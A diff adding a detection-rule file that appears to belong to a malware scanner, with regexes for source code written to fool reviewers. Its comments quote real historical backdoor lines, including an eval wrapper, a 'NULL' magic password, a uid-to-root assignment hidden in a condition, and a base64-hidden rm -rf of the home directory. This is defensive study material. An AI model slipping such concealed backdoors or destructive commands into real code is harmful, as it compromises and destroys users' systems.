@@ -1,0 +1,353 @@
+# Source written to be misread by the person reviewing it.
+#
+# A backdoor that survives code review does not hide from the compiler, it
+# hides from a reader skimming a diff. Two of the oldest supply-chain
+# compromises in this corpus use the same trick from opposite directions: name
+# the dangerous thing after a safe one, or write the dangerous thing so it
+# looks like a familiar safe idiom.
+#
+# WordPress 2.1.1 (2007) added `comment_text_phpfilter($d) { eval($d); }` to
+# wp-includes/feed.php, beside the file's real `comment_text_rss`. A reviewer
+# scanning function names sees another content filter.
+#
+# wu-ftpd 2.1f/2.2 (1994) conjoined `strcmp(passwd, "NULL")` into the password
+# failure predicate. That reads as a null check -- which is exactly what the
+# surrounding lines do, two of them testing `*pw->pw_passwd == '\0'`. It is
+# not a null check. It compares the supplied password against the four
+# characters N, U, L, L, and typing that as your password logs you in as
+# anyone.
+#
+# These are stated separately from the rules that describe what the code does
+# because they describe something different: not the capability, but the
+# effort spent making the capability unreadable. A finding here tells a
+# reviewer the deception was deliberate, which no capability rule establishes.
+defaults:
+  platforms: [unix, windows]
+  attack: T1036
+  mbc: F0001
+
+traits:
+  - id: data-handling-function-name
+    desc: Function named for handling data safely
+    crit: component
+    conf: 0.85
+    for: [php, text]
+    # `filter`, `format`, `sanitize`, `escape` -- the vocabulary of code that
+    # makes input safe. Harmless on its own; nearly every codebase has some.
+    if:
+      type: text
+      regex: 'function\s+\w{0,24}(filter|format|saniti)\w{0,24}\s*\(\s*\$'
+
+  - id: credential-compared-to-absence-literal
+    desc: Credential compared to an absence word
+    crit: suspicious
+    conf: 0.93
+    for: [c, cpp, text]
+    # A password or username tested against the literal string "NULL", "nil",
+    # "none" or "undefined". Every one of those is a word for *no value*, and
+    # that is the point: the line reads as a check for a missing credential
+    # while actually accepting one specific credential. Real absence checks
+    # compare against a null pointer or an empty string, never against the
+    # spelling of the word.
+    if:
+      type: text
+      regex: '\bstr\w{0,4}cmp\s*\([^;\n]{0,32}(pass|user|login)\w{0,4}\s*,\s*"(NULL|nil|none)"'
+      case_insensitive: true
+
+  - id: comparison-then-assignment-in-one-condition
+    desc: Condition compares then assigns
+    crit: suspicious
+    conf: 0.93
+    for: [c, cpp, text]
+    # `if ((options == (A|B)) && (current->uid = 0))`. The reader parses a
+    # real `==` first, and the eye carries that reading into the second
+    # clause, where a single `=` is doing the work. Requiring both operators
+    # in one predicate is what separates this from an ordinary assignment
+    # someone wrote deliberately, which stands alone.
+    if:
+      type: text
+      regex: '==[^;\n]{0,60}&&[^;\n]{0,20}(->|\.)(e|s|fs)?[ug]id\s*=\s*0'
+
+  - id: errno-assignment-statement
+    desc: Assigns a negative errno constant
+    crit: component
+    conf: 0.85
+    for: [c, cpp, text]
+    # `retval = -EINVAL;`. Counted rather than located: two of these in a row
+    # means the first one never survives.
+    if:
+      type: text
+      regex: '^[+\s]*\w{1,16}\s*=\s*-E[A-Z]{2,10}\s*;'
+    count_min: 2
+
+  - id: constant-defined-from-request-value
+    desc: Defines a constant from request input
+    crit: suspicious
+    conf: 0.92
+    for: [php, text]
+    # `define('SM_PATH', $_SERVER['HTTP_BASE_PATH'])`. Any `HTTP_*` key in
+    # $_SERVER is a request header, so the caller names it and fills it.
+    if:
+      type: text
+      regex: 'define\s*\(\s*[''"]\w{1,32}[''"]\s*,\s*\$_(SERVER|GET|POST)\s*\['
+
+  - id: constant-defined-from-literal
+    desc: Defines a constant from a literal
+    crit: component
+    conf: 0.85
+    for: [php, text]
+    if:
+      type: text
+      regex: 'define\s*\(\s*[''"]\w{1,32}[''"]\s*,\s*[''"][^''"\n]{0,40}[''"]\s*\)'
+
+  - id: indexed-byte-hex-compare
+    desc: Buffer byte compared to hex value
+    crit: component
+    conf: 0.85
+    for: [c, cpp, text]
+    if:
+      type: text
+      regex: '\[\s*\w{1,6}\s*\]\s*==\s*0x[0-9a-fA-F]{2}'
+
+  - id: next-byte-hex-compare
+    desc: Next byte compared to hex value
+    crit: notable
+    conf: 0.85
+    for: [c, cpp, text]
+    # `p_buf[i+1] == 0x29`. Two adjacent bytes tested against fixed values is
+    # a signature check, not parsing.
+    if:
+      type: text
+      regex: '\[\s*\w{1,6}\s*\+\s*1\s*\]\s*==\s*0x[0-9a-fA-F]{2}'
+
+  - id: character-class-helper-call
+    desc: Calls a character-class helper
+    crit: component
+    conf: 0.85
+    for: [c, cpp, text]
+    if:
+      type: text
+      # No leading \b: projects wrap these as `vsf_sysutil_isspace`, and an
+      # underscore is a word character, so a boundary anchor never matches the
+      # wrapped form -- which is the form that actually appears.
+      regex: 'is(space|alpha|digit)\w{0,4}\s*\('
+
+  - id: base64-decoded-command-default
+    desc: Command name decoded from base64
+    crit: notable
+    conf: 0.93
+    for: [shell, makefile, text]
+    # `meson=${meson:-`base64 -d <<< L2Jpbi9ybQo=`}`. The `:-` default idiom
+    # is ordinary shell; what is being defaulted is not. A build script names
+    # its tools in plain text -- there is no portability or escaping reason to
+    # encode `/bin/rm`, only a reading reason.
+    if:
+      type: text
+      regex: '\$\{[A-Za-z_]\w{0,20}:-[^}]{0,30}base64\s+-d'
+
+  - id: exec-of-variable-command
+    desc: Execs a command held in a variable
+    crit: component
+    conf: 0.85
+    for: [shell, makefile, text]
+    if:
+      type: text
+      regex: '\bexec\s+"?\$\{?[A-Za-z_]\w{0,20}'
+
+composite_rules:
+  - id: execution-sink-named-as-sanitiser
+    desc: Exec sink named as a data sanitiser
+    crit: hostile
+    conf: 0.96
+    for: [php, text]
+    near_lines: 1
+    # A function whose entire body is eval/passthru/shell_exec, carrying a name
+    # from the vocabulary of input sanitisation. The capability rule in
+    # backdoor/webshell states that the wrapper runs request input; this states
+    # that it was dressed up as the opposite of what it is, which is why it
+    # sat in a core WordPress file for weeks.
+    all:
+      - id: objectives/command-and-control/backdoor/webshell/wrapper::function-body-is-execution-sink
+      - id: data-handling-function-name
+    unless:
+      - id: metadata/package/testing/
+
+  - id: credential-backdoor-disguised-as-null-check
+    desc: Magic credential disguised as null check
+    crit: hostile
+    conf: 0.95
+    for: [c, cpp, text]
+    near_lines: 3
+    # The absence-word comparison sitting in the same predicate as the real
+    # password check. Either half alone is explainable; together they are a
+    # magic credential written to be skimmed past.
+    all:
+      - id: credential-compared-to-absence-literal
+      - id: objectives/command-and-control/backdoor/auth-bypass::credential-field-comparison
+    unless:
+      - id: metadata/package/testing/
+
+  - id: privilege-assignment-behind-decoy-branch
+    desc: Decoy branch hides a privilege assignment
+    crit: hostile
+    conf: 0.95
+    for: [c, cpp, text]
+    near_lines: 4
+    # The Linux kernel/exit.c injection of November 2003, stated as the
+    # deception rather than the effect. Two lines were added to sys_wait4:
+    #
+    #   if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
+    #           retval = -EINVAL;
+    #   retval = -ECHILD;
+    #
+    # The branch body is dead -- the next unconditional line overwrites it --
+    # and -EINVAL is the same code the function's real argument validation
+    # returns at the top, so the whole thing reads as a late options check.
+    # It does nothing. The work is the `=` in the condition, which makes the
+    # caller root. A branch whose body cannot outlive the following statement
+    # is not a check; it is cover for whatever the condition did.
+    #
+    # Either tell is enough: the mixed comparison, or the dead branch.
+    all:
+      - id: objectives/privilege-escalation/elevation-control/setuid/source::privilege-field-assigned-in-condition
+    any:
+      - id: comparison-then-assignment-in-one-condition
+      - id: errno-assignment-statement
+    unless:
+      - id: metadata/package/testing/
+
+  - id: request-constant-shadows-literal-constant
+    desc: Request constant shadows a literal one
+    crit: hostile
+    conf: 0.94
+    for: [php, text]
+    near_lines: 4
+    # The SquirrelMail 1.4.12 injection, stated as the deception. Four lines
+    # went in above the file's existing definition:
+    #
+    #   /** set the value of the base path */
+    #   if (isset($_SERVER['HTTP_BASE_PATH'])) {
+    #       define('SM_PATH',$_SERVER['HTTP_BASE_PATH']);
+    #   }
+    #   define('SM_PATH','../');          <- the original, left in place
+    #
+    # PHP keeps the first definition of a constant, so the surviving literal
+    # is inert. It is also the line a reviewer reads: the file still appears
+    # to hardcode a safe relative path, and the docblock above the injection
+    # copies the style of the real one two lines up. Leaving the original
+    # visible is the whole trick.
+    #
+    # Proximity stands in for identity: the engine's regex has no
+    # backreferences, so the rule cannot require both defines to name the same
+    # constant. Within four lines that costs little -- defining any constant
+    # from a request value is already the unusual part.
+    all:
+      - id: constant-defined-from-request-value
+      - id: constant-defined-from-literal
+    unless:
+      - id: metadata/package/testing/
+
+  - id: magic-byte-trigger-in-character-scanner
+    desc: Magic byte test inside a character scanner
+    crit: hostile
+    conf: 0.95
+    for: [c, cpp, text]
+    near_lines: 8
+    # vsftpd 2.3.4. The command-and-control rules state that a magic byte
+    # sequence dispatches a bind shell. This states where the attacker put
+    # the test: inside `str_contains_space()`, a helper whose entire job is
+    # deciding whether a string has whitespace in it. The loop calls
+    # `vsf_sysutil_isspace()` on each byte, and the injected lines sit in the
+    # `else` arm looking for 0x3a 0x29 -- a smiley.
+    #
+    # Nobody audits a whitespace helper. That is the whole reason it is there,
+    # and it is a different fact from the trigger existing: it tells a reviewer
+    # the author chose a function where the addition would read as parsing,
+    # and it generalises to any signature check smuggled into a byte loop
+    # whose stated purpose is character classification.
+    all:
+      - id: indexed-byte-hex-compare
+      - id: next-byte-hex-compare
+      - id: character-class-helper-call
+    unless:
+      - id: metadata/package/testing/
+
+  - id: build-execs-base64-hidden-command
+    desc: Build execs a base64-hidden command
+    crit: hostile
+    conf: 0.95
+    for: [shell, makefile, text]
+    near_lines: 40
+    # The Gentoo `configure` wrapper of the 2018 GitHub-organisation
+    # compromise. Its last line is
+    #
+    #   exec ${meson} -rf build "${args[@]}" $HOME ~/
+    #
+    # which reads as handing the build over to meson. `${meson}` was defaulted
+    # at the top of the file to a base64 blob decoding to `/bin/rm`, so the
+    # line actually runs `rm -rf` across the invoking user's home directory.
+    #
+    # The impact rules state what it destroys. This states why nobody caught
+    # it while reading: every token on the executing line is plausible, and
+    # the one that is not is defined twenty lines earlier in an idiom that
+    # exists to look unremarkable. Encoding a *command name* -- as opposed to
+    # data -- has no benign purpose in a build script.
+    all:
+      - id: base64-decoded-command-default
+      - id: exec-of-variable-command
+    unless:
+      - id: metadata/package/testing/
+
+  - id: payload-hidden-in-test-fixture
+    desc: Test fixture carries an executable payload
+    crit: hostile
+    conf: 0.95
+    for: [javascript, typescript]
+    # flatmap-stream, the dependency slipped into event-stream, kept its
+    # payload in `test/data.js`. The supply-chain rules describe the loader
+    # that decrypts and compiles it. This describes where it was parked.
+    #
+    # A test directory is the one place in a package that reviewers, linters
+    # and publish-time checks all skip by design, and where a large opaque
+    # blob is unremarkable -- fixtures are supposed to be inert data. That is
+    # the whole reason to put a cipher payload there rather than beside the
+    # code that loads it. sendmail 8.12.6 used the same hiding place twenty
+    # years earlier for the same reason, which is why this is stated as its
+    # own technique rather than folded into whichever loader happens to
+    # collect it.
+    #
+    # The test-path traits are used as positive evidence here. They are the
+    # finding, not a reason to suppress one -- the opposite of the
+    # directory-wide `unless:` mistake documented on the sibling stego rule.
+    all:
+      - id: metadata/package/testing/presence/harness::test-directory-path
+      - id: micro-behaviors/data/encode/payload::large-encoded-blob-literal
+    any:
+      - id: micro-behaviors/crypto/symmetric/aes/runtime-library::create-decipher-hex-hidden
+      - id: micro-behaviors/process/interpreter/eval/compile::module-compile-hex-hidden
+
+  - id: logging-named-macro-runs-commands
+    desc: Debug-named macro expands to system
+    crit: hostile
+    conf: 0.95
+    for: [c, cpp, text]
+    # UnrealIRCd 3.2.8.1. The backdoor is three preprocessor lines added to
+    # `include/struct.h`, and the load-bearing one is:
+    #
+    #   #define DEBUG3_DOLOG_SYSTEM(x) system(x)
+    #
+    # Every use of it is written `DEBUG3_LOG(x)`, so the call sites read as
+    # logging. The name is not merely innocuous, it is drawn from the
+    # project's own debug vocabulary and defined among its real DEBUGMODE
+    # macros, which is why the addition survived review and shipped for seven
+    # months.
+    #
+    # The dispatch rules describe the trigger -- a magic "AB" prefix on an
+    # inbound line. This describes the concealment, and it is the half that
+    # generalises: any macro that promises to log and delivers execution puts
+    # a `system()` behind a name a reader will skip.
+    all:
+      - id: micro-behaviors/process/create/shell/native::c-debug-system-macro-wrapper
+    any:
+      - id: objectives/command-and-control/backdoor/dispatch/shell::debug-macro-system-wrapper
+      - id: objectives/command-and-control/backdoor/dispatch/shell::source-tree-debug-macro-command-trigger
